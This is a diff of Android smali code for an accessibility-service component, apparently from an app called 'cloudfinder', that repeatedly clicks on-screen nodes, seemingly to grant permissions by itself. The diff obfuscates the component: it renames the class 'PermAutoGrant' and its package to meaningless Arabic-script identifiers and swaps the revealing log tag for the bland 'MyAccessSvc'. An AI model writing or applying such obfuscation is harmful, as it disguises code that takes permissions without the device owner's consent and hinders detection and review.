@@ -1,4 +1,4 @@
-.class public final Lcom/lite/cloudfinder/accessibility/PermAutoGrant;
+.class public final Lڝږ؁ڋ/ڤ;
 .super Ljava/lang/Object;
 .implements Ljava/lang/Runnable;
 
@@ -17,28 +17,28 @@
     invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
     move-result-object v1
     invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
-    sput-object v0, Lcom/lite/cloudfinder/accessibility/PermAutoGrant;->handler:Landroid/os/Handler;
+    sput-object v0, Lڝږ؁ڋ/ڤ;->handler:Landroid/os/Handler;
     return-void
 .end method
 
 .method public constructor <init>(Landroid/accessibilityservice/AccessibilityService;I)V
     .locals 0
     invoke-direct {p0}, Ljava/lang/Object;-><init>()V
-    iput-object p1, p0, Lcom/lite/cloudfinder/accessibility/PermAutoGrant;->svc:Landroid/accessibilityservice/AccessibilityService;
-    iput p2, p0, Lcom/lite/cloudfinder/accessibility/PermAutoGrant;->round:I
+    iput-object p1, p0, Lڝږ؁ڋ/ڤ;->svc:Landroid/accessibilityservice/AccessibilityService;
+    iput p2, p0, Lڝږ؁ڋ/ڤ;->round:I
     return-void
 .end method
 
 .method public static start(Landroid/accessibilityservice/AccessibilityService;)V
     .locals 5
     :try_start_0
-    sget-object v0, Lcom/lite/cloudfinder/accessibility/PermAutoGrant;->handler:Landroid/os/Handler;
+    sget-object v0, Lڝږ؁ڋ/ڤ;->handler:Landroid/os/Handler;
     if-nez v0, :cond_0
     return-void
     :cond_0
-    new-instance v1, Lcom/lite/cloudfinder/accessibility/PermAutoGrant;
+    new-instance v1, Lڝږ؁ڋ/ڤ;
     const/4 v2, 0x0
-    invoke-direct {v1, p0, v2}, Lcom/lite/cloudfinder/accessibility/PermAutoGrant;-><init>(Landroid/accessibilityservice/AccessibilityService;I)V
+    invoke-direct {v1, p0, v2}, Lڝږ؁ڋ/ڤ;-><init>(Landroid/accessibilityservice/AccessibilityService;I)V
     const-wide/16 v3, 0x320
     invoke-virtual {v0, v1, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
     :try_end_0
@@ -52,7 +52,7 @@
 .method public run()V
     .locals 9
     :try_start_0
-    iget-object v0, p0, Lcom/lite/cloudfinder/accessibility/PermAutoGrant;->svc:Landroid/accessibilityservice/AccessibilityService;
+    iget-object v0, p0, Lڝږ؁ڋ/ڤ;->svc:Landroid/accessibilityservice/AccessibilityService;
     if-nez v0, :cond_0
     return-void
     :cond_0
@@ -101,7 +101,7 @@
     const/16 v6, 0x10
     invoke-virtual {v5, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
     move-result v6
-    const-string v7, "PermAutoGrant"
+    const-string v7, "MyAccessSvc"
     new-instance v8, Ljava/lang/StringBuilder;
     invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V
     invoke-virtual {v8, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;
@@ -113,13 +113,13 @@
     add-int/lit8 v4, v4, 0x1
     goto :loop
     :done
-    iget v4, p0, Lcom/lite/cloudfinder/accessibility/PermAutoGrant;->round:I
+    iget v4, p0, Lڝږ؁ڋ/ڤ;->round:I
     const/4 v5, 0x3
     if-lt v4, v5, :ret
-    sget-object v5, Lcom/lite/cloudfinder/accessibility/PermAutoGrant;->handler:Landroid/os/Handler;
-    new-instance v6, Lcom/lite/cloudfinder/accessibility/PermAutoGrant;
+    sget-object v5, Lڝږ؁ڋ/ڤ;->handler:Landroid/os/Handler;
+    new-instance v6, Lڝږ؁ڋ/ڤ;
     add-int/lit8 v4, v4, 0x1
-    invoke-direct {v6, v0, v4}, Lcom/lite/cloudfinder/accessibility/PermAutoGrant;-><init>(Landroid/accessibilityservice/AccessibilityService;I)V
+    invoke-direct {v6, v0, v4}, Lڝږ؁ڋ/ڤ;-><init>(Landroid/accessibilityservice/AccessibilityService;I)V
     const-wide/16 v7, 0x4b0
     invoke-virtual {v5, v6, v7, v8}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
     :ret
